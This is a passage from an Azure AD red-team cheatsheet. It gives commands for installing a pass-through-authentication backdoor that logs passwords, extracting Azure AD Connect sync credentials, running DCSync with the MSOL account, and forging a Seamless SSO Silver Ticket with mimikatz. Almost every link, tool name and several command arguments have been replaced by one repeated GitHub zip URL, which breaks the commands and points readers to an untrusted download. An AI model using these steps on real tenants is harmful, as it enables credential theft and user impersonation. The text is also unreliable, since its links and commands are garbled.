1. Check if PTA is installed : `Get-Command -Module PassthroughAuthPSModule`
2. Install a PTA Backdoor
    ```powershell
    PS AADInternals> Install-AADIntPTASpy
    PS AADInternals> Get-AADIntPTASpyLog -DecodePasswords
    ```


### Azure AD Connect - Password extraction

Credentials in AD Sync : C:\Program Files\Microsoft Azure AD Sync\Data\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip

Tool | Requires code execution on target | DLL dependencies | Requires MSSQL locally | Requires python locally
--- | --- | --- | --- | ---
ADSyncDecrypt | Yes | Yes | No | No
ADSyncGather | Yes | No | No | Yes
ADSyncQuery | No (network RPC calls only) | No | Yes | Yes


```powershell
git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
# DCSync with AD Sync account
```

### Azure AD Connect - MSOL Account's password and DCSync

You can perform **DCSync** attack using the MSOL account.

Requirements:
  * Compromise a server with Azure AD Connect service
  * Access to ADSyncAdmins or local Administrators groups

Use the script **https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip** from @xpn to recover the decrypted password for the MSOL account:
* `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`: AD Connect Sync Credential Extract POC https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
* `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip

Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.

### Azure AD Connect - Seamless Single Sign On Silver Ticket

> Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)

> Seamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account **AZUREADSSOC** is created in the on-prem AD.

:warning: The password of the AZUREADSSOACC account never changes.

Using [https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip) to convert Kerberos tickets to SAML and JWT for Office 365 & Azure

1. NTLM password hash of the AZUREADSSOACC account, e.g. `f9969e088b2c13d93833d0ce436c76dd`. 
    ```powershell
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip "lsadump::dcsync /user:AZUREADSSOACC$" exit
    ```
2. AAD logon name of the user we want to impersonate, e.g. `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`. This is typically either his userPrincipalName or mail attribute from the on-prem AD.
3. SID of the user we want to impersonate, e.g. `S-1-5-21-2121516926-2695913149-3163778339-1234`.
4. Create the Silver Ticket and inject it into Kerberos cache:
    ```powershell
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip "kerberos::golden /user:elrond
    /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip /rc4:f9969e088b2c13d93833d0ce436c76dd
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip /service:HTTP /ptt" exit
    ```
5. Launch Mozilla Firefox
6. Go to about:config and set the `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip preference` to value `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip,https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
7. Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.


## References

* [Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !!](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Azure AD Pass The Certificate - Mor - Aug 19, 2020](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Get Access Tokens for Managed Service Identity on Azure App Service](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [An introduction to penetration testing Azure - Graceful Security](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Running Powershell scripts on Azure VM - Netspi](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Attacking Azure Cloud shell - Netspi](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Maintaining Azure Persistence via automation accounts - Netspi](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Detecting an attacks on active directory with Azure - Smartspate](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Azure AD Overview](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip) 
* [Windows Azure Active Directory in plain English](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Building Free Active Directory Lab in Azure - https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip) 
* [Attacking Azure/Azure AD and introducing Powerzure - SpecterOps](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Azure AD connect for RedTeam - @xpnsec](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
